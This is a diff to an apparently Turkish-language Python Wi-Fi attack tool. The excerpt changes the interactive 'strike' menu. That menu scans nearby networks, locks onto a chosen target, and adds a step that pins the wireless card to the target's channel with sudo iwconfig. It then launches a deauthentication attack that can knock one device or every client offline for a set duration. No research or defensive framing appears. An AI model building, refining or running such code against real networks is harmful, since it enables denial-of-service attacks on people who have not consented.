@@ -141,7 +141,6 @@ def strike_ui():
             
             engine.toggle_monitor(iface, "start")
             
-            # AMELİYAT BURADA: Kullanıcıdan BSSID istemek yerine otomatik taratıyoruz
             print(f"\n    {Colors.CYAN}[*] Hedef seçimi için etraf taranıyor...{Colors.END}")
             found_nets = radar.auto_scan_and_select(iface) 
             
@@ -150,27 +149,28 @@ def strike_ui():
                 time.sleep(2)
                 continue
             
-            # Sinyal barlı listeyi ekrana bas
             print(f"\n    {Colors.CYAN}{'ID':<3} {'SİNYAL':<15} {'SSID':<25} {'BSSID':<20} {'CH'}{Colors.END}")
             print("    " + "-"*75)
             for i, net in enumerate(found_nets):
                 bar = radar.get_signal_bar(net['dbm'])
                 print(f"    {Colors.YELLOW}[{i}]{Colors.END} {bar:<15} {net['essid'][:23]:<25} {net['bssid']:<20} {net['ch']}")
             
-            # Kullanıcıdan sadece numarayı alıyoruz
             secim = input(f"\n    Hangi ağı düşürüyoruz? (ID girin): ")
             if secim.isdigit() and int(secim) < len(found_nets):
                 target = found_nets[int(secim)]
-                bssid = target['bssid'] # BSSID otomatik çekildi!
-                print(f"    [✔] Hedef Kilitlendi: {target['essid']} ({bssid})")
+                bssid = target['bssid']
+                ch = target['ch'] # HEDEFİN KANALINI ALDIK
                 
-                # Spesifik düşürme ise MAC iste, değilse boş geç
+                print(f"    [✔] Hedef Kilitlendi: {target['essid']} ({bssid}) - Kanal: {ch}")
+                
+                # İŞTE SİHİRLİ DOKUNUŞ: KARTIN KANALINI HEDEFE SABİTLE!
+                engine.run_cmd(f"sudo iwconfig {iface} channel {ch}")
+                
                 client = input("    Düşürülecek Cihaz MAC (Boş bırakırsan ağdaki herkes düşer): ") if sub == "2" else None
                 
                 timer_str = input("    Saldırı Süresi (Saniye, sınırsız için 0): ")
                 timer = int(timer_str) if timer_str.isdigit() else 0
                 
-                # Vuruş başlasın!
                 strike.pulse_kick(iface, bssid, client, timer)
                 input("\n    Devam etmek için Enter...")
             else:
